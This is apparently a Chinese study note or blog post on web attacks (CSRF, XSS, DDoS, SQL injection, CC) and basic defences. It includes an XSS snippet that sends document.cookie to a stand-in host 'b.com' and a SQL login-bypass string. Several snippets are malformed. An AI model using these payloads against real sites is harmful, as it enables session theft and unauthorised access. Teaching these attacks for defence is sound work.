---
title: xss、cors、cc的攻击和防御
date: 2018-04-09 15:09:55
tags: http
---

## cors
- 定义
    - Cross-Origin Resource-Sharing（跨站资源共享）
    - 当一个资源从与该资源所在的服务器不同域请求资源时，会发起一个跨域http请求，如 a.com 的html( &lt;img src="cdn.com/a.png" /&gt; )向 cdn.com 请求图片等资源，网络上的许多站点都会加载来自不同域的css样式、图像、脚本等资源
    - 可指定一个origin，在许可范围内
- 同源策略
    - 浏览器限制从脚本发出的跨域http请求，ajax遵循同源策略
    - jsonp
- 使用cors进行跨域
    - 在请求头中携带origin的header
    - 服务端响应头添加 Access-Control-Allow-Origin || Access-Control-Allow-Methods ，来返回验证结果
- csrf
    - Cross-Site Request Forgery（跨站请求伪造）
    - 用户通过浏览器正常访问站点A，通过A的身份认证A站点，A产生所使用的cookie等验证信息
    - 此时A保持登录状态，另起一个窗口打开B站点，站点B接收到用户请求后，返回一些攻击代码请求A的资源
    - 浏览器执行恶意代码，在用户不知情情况下携带cookie等用户验证信息，向A发起请求，导致来自B的恶意代码被执行
    - 代码
    ```JavaScript
        <script>
            var a = `a.com/a.php?user="hhj"&pwd="j"`;
            var b = `b.com`;
        </script> 
    ```
    - 防御
        - 重要数据交互采用post进行接受
        - 使用验证码
        - 验证Http Referer字段，即此次Http请求的来源地址
        - 为每个表单添加Token并验证

## xss
- Cross-Site Scripting（跨站脚本攻击），防止与css一样，用xss；指攻击者在页面里插入而已script代码，当用户浏览页面时，嵌入其中的恶意代码会被执行
- 攻击方式
    - 发出请求时，xss代码出现在url中，作为输出会被提交并解析后响应，最后返回给浏览器，浏览器解析执行xss代码
    ```JavaScript
        <script>
            var url = `a.com?send="<script>alert('xss test')<script>"`; // 里面的xss test会被执行
            var url = `a.com?send="<script type='text/script' src='src/xss.js'><script>"`; // 执行这段js
        </script>
    ```
    - 表单存到数据库的时候，攻击者会将恶意代码保存至数据库，后面客户端执行至这段代码会被恶意执行
    ```html
        <input type="text" value="<script>alert('xss test')</script>" /> 
        <!-- 保存至数据库，后面从数据库拉去数据在页面执行的时候，会恶意执行 -->
        <input type="text" value="<div>破坏布局，伪造页面效果</div>" /> 
        <input type="text" value="#123" />
        <!-- php中的#会被当成注释、如其他里面可以试试// || /**/ -->
        <sctipt>
            var s = document.cookie, h = document.createElement('a');
            h.href = "b.com?"+ s;
            h.innerHtml = '<img src="../xss.png">';
            document.body.appendChild(h);
        </script>
    ```
- 防御
    - “所有的输入都是有害的”：对输入数据进行过滤
        - 对数据进行html encode处理
        - 对一些特殊符号进行转义，例如 < script>、< iframe>、&lt < 、&gt >
        - 过滤js事件的标签，例如onclick、onfoucus
    - 将重要的cookie标记为http only，这样页面上js的document.cookie语气就不能获取到cookie
    - 对数据
    - 服务器段对输入的数据进行xss clean处理

## ddos
- distributed Denial Of Service（分布式拒绝服务攻击）
- 通过大量合法请求占用大量资源，以达到瘫痪网络的目的。
    - 通过向服务器提交大量请求，使服务器超负荷
    - 阻断某服务与特定系统或个人的通讯
    - ip欺骗是一种黑客通过像服务器发送虚假包以欺骗服务器的做法，服务器接收到包便会返回接受请求包，但实际上这个包是虚假的包无法返回到来源处，这就造成了浪费服务器的资源
    - 攻击请求包中的源地址和目标地址，导致被攻击的机器死循环，最终耗尽资源而死机
- 被攻击现象（百度百科）
    - 被攻击主机上有大量等待的Tcp连接
    - 网络中存在大量的无用数据包
    - 源地址为假，制造高流量无用数据，造成网络拥堵，使得受害主机无法正常和外界通讯
- 防御
    - 关闭没必要的服务
    - 黑名单机制
    - 加大服务量

## sql注入
- 通过把sql命令插入到web表单提交、输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的sql命令
- 注入方法
    - 猜测表名、列名
        ```Sql
            And (Select (col列名) from tb_sql表名) ... // 不知道
        ```
    - 后台身份验证绕过漏洞
    ```Sql
        Select * from t_sql Where user=''or 'a'='a' And passwd=''or 'a'='a'
    ```
- 防御
    - 检查输入：确定输入字符类型、加密处理
    - 数据库安全：修改密码什么的，对系统注意分配权限

## cc攻击
- Challenge Collapsar（挑战黑洞），利用不断对网站发送请求致使形成拒绝服务的目的

## 参考链接
- [cors.csrf](https://yq.aliyun.com/articles/69313)
- [xss](https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_label3)
- [ddos](https://baike.baidu.com/item/%E5%88%86%E5%B8%83%E5%BC%8F%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB)
- [sql注入](https://baike.baidu.com/item/sql%E6%B3%A8%E5%85%A5)